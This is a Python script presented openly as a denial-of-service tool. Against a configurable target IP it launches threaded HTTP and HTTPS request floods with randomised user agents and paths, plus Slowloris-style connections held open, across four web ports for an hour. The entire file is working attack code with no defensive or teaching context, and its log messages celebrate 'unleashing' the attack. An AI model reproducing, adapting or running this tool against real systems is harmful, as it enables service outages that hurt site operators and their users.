import threading
import time
import random
import logging
import requests
from fake_useragent import UserAgent

# --- CONFIGURATION ---
TARGET_IP = "123.123.123.123"  # REPLACE WITH TARGET IP
TARGET_PORTS = [80, 443, 8080, 8443]  # Common web ports
THREAD_COUNT = 300  # Total threads (reduce from 1500 for stability)
REQUEST_DELAY = 0.001  # Base delay between requests
RUN_TIME = 3600  # Attack duration in seconds

# --- SETUP LOGGING ---
logging.basicConfig(level=logging.INFO, format='[SHUTDOWN] %(message)s')

# --- USER AGENT & PATHS ---
ua = UserAgent()
paths = [
    "/", "/login", "/admin", "/api", "/wp-login.php",
    "/index.php", "/search", "/cart", "/checkout"
]

# --- SLOWLORIS HEADERS DYNAMICALLY GENERATED ---
def get_slowloris_headers():
    return {
        "User-Agent": ua.random,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Connection": "keep-alive",
        "Keep-Alive": "900",
        "Content-Length": "1000000",
        "X-Random": str(random.randint(1, 999999))
    }

# --- ATTACK FUNCTIONS ---
def http_flood(ip, port, stop_event):
    end_time = time.time() + RUN_TIME
    while time.time() < end_time and not stop_event.is_set():
        try:
            url = f"http://{ip}:{port}{random.choice(paths)}"
            headers = {"User-Agent": ua.random}
            requests.get(url, headers=headers, timeout=5)
            logging.info(f"HTTP FLOOD: {url}")
        except Exception:
            pass
        time.sleep(REQUEST_DELAY + random.uniform(0, REQUEST_DELAY))

def https_flood(ip, port, stop_event):
    end_time = time.time() + RUN_TIME
    while time.time() < end_time and not stop_event.is_set():
        try:
            url = f"https://{ip}:{port}{random.choice(paths)}"
            headers = {"User-Agent": ua.random}
            requests.get(url, headers=headers, timeout=5, verify=False)
            logging.info(f"HTTPS FLOOD: {url}")
        except Exception:
            pass
        time.sleep(REQUEST_DELAY + random.uniform(0, REQUEST_DELAY))

def slowloris(ip, port, stop_event):
    end_time = time.time() + RUN_TIME
    session = requests.Session()
    while time.time() < end_time and not stop_event.is_set():
        try:
            headers = get_slowloris_headers()
            url = f"http://{ip}:{port}/"
            session.get(url, headers=headers, stream=True, timeout=1000)
            logging.info(f"SLOWLORIS OPEN: {ip}:{port}")
            time.sleep(1000)  # Keep connection open
        except Exception:
            pass

# --- MAIN ATTACK CONTROLLER ---
def start_attack():
    stop_event = threading.Event()
    logging.info(f"UNLEASHING LAYER 4 HELL ON {TARGET_IP}!")
    threads = []

    threads_per_port = THREAD_COUNT // len(TARGET_PORTS)
    threads_per_type = threads_per_port // 3

    for port in TARGET_PORTS:
        for _ in range(threads_per_type):
            t_http = threading.Thread(target=http_flood, args=(TARGET_IP, port, stop_event), daemon=True)
            t_https = threading.Thread(target=https_flood, args=(TARGET_IP, port, stop_event), daemon=True)
            t_slow = threading.Thread(target=slowloris, args=(TARGET_IP, port, stop_event), daemon=True)
            t_http.start()
            t_https.start()
            t_slow.start()
            threads.extend([t_http, t_https, t_slow])

    try:
        while any(t.is_alive() for t in threads):
            time.sleep(1)
    except KeyboardInterrupt:
        logging.info("Attack interrupted by user.")
        stop_event.set()
        for t in threads:
            t.join(timeout=5)

if __name__ == "__main__":
    start_attack()
